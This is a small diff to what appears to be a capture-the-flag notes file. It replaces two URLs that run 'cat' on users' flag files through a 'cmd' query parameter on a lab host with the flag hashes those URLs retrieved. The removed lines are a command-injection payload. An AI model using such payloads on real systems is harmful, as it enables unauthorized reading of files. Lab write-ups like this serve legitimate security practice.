@@ -182,10 +182,12 @@ kill -9 1277
 >flags
 
 '''
-http://10.10.163.118:3000/?cmd=cat%20/home/bunny/user.txt
-http://10.10.163.118:3000/?cmd=cat%20/home/jordan/user.txt
+/home/jordan/user.txt
+79973eb57d0188ffc6c85a1a4e57a516
 
-(forgot to copy it sry)
+(same flag as jordan)
+/home/bunny/user.txt
+79973eb57d0188ffc6c85a1a4e57a516
 '''
 
 '''
